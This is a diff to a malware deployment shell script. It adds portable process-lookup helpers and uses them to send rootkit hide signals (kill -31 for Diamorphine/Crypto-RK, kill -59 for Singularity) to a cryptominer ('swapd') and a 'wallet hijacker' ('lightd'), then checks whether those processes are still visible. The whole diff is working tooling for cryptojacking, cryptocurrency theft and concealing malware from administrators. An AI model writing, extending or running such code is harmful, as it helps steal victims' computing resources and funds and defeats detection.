@@ -34,6 +34,30 @@ set +ue          # Disable exit on error
 set +o pipefail  # Disable pipeline error propagation
 IFS=$'\n\t'
 
+# ---- Portable PID helpers (BusyBox + full Linux) ----
+# Works without pgrep and without ps -aux (BusyBox ps has neither)
+proc_pids() {
+    local pattern="$1"
+    if command -v pgrep >/dev/null 2>&1; then
+        pgrep -f "$pattern" 2>/dev/null || true
+    else
+        for _d in /proc/[0-9]*; do
+            _p="${_d##*/}"
+            _c=$(tr "\0" " " < "$_d/cmdline" 2>/dev/null) || continue
+            case "$_c" in *"$pattern"*) echo "$_p" ;; esac
+        done
+    fi
+}
+send_sig() {
+    local sig="$1"; shift
+    for _pat in "$@"; do
+        proc_pids "$_pat" | while IFS= read -r _pid; do
+            [ -n "$_pid" ] && kill "-$sig" "$_pid" 2>/dev/null || true
+        done
+    done
+}
+
+
 # Trap errors but continue execution
 if [ "$VERBOSE" = true ]; then
     trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
@@ -2120,12 +2144,12 @@ echo ''
 # Check if processes are actually hidden
 PROCESSES_VISIBLE=false
 
-if pgrep -x swapd >/dev/null 2>&1; then
+if proc_pids swapd | grep -q . 2>/dev/null; then
     PROCESSES_VISIBLE=true
     echo '[⚠] WARNING: Miner processes are STILL VISIBLE in ps output!'
 fi
 
-if pgrep -f "lightd.*daemon" >/dev/null 2>&1; then
+if proc_pids lightd | grep -q . 2>/dev/null; then
     PROCESSES_VISIBLE=true
     echo '[⚠] WARNING: Wallet hijacker is STILL VISIBLE in ps output!'
 fi
@@ -2173,24 +2197,14 @@ echo "[*] Sending hide signals unconditionally..."
 echo "[*] Note: rootkits hide themselves from lsmod — signals sent regardless"
 sleep 3  # Give processes time to be fully up before hiding
 
-# Send all signals unconditionally — rootkits hide themselves from lsmod,
-# so lsmod checks always return false even when loaded. Signals are harmless
-# if no rootkit intercepts them (process just receives an unhandled RT signal).
-
 # ---- kill -31: Diamorphine + Crypto-RK hide signal ----
 echo "[*] Sending kill -31 (Diamorphine/Crypto-RK hide)..."
-pgrep -f config.json  | xargs -r kill -31 2>/dev/null || true
-pgrep -x swapd        | xargs -r kill -31 2>/dev/null || true
-pgrep -f swapfile     | xargs -r kill -31 2>/dev/null || true
-pgrep -x lightd       | xargs -r kill -31 2>/dev/null || true
+send_sig 31 config.json swapd swapfile lightd
 echo "[✓] kill -31 sent"
 
 # ---- kill -59: Singularity toggle hide signal ----
 echo "[*] Sending kill -59 (Singularity toggle hide)..."
-pgrep -f config.json  | xargs -r kill -59 2>/dev/null || true
-pgrep -x swapd        | xargs -r kill -59 2>/dev/null || true
-pgrep -f swapfile     | xargs -r kill -59 2>/dev/null || true
-pgrep -x lightd       | xargs -r kill -59 2>/dev/null || true
+send_sig 59 config.json swapd swapfile lightd
 echo "[✓] kill -59 sent"
 
 echo '========================================================================'
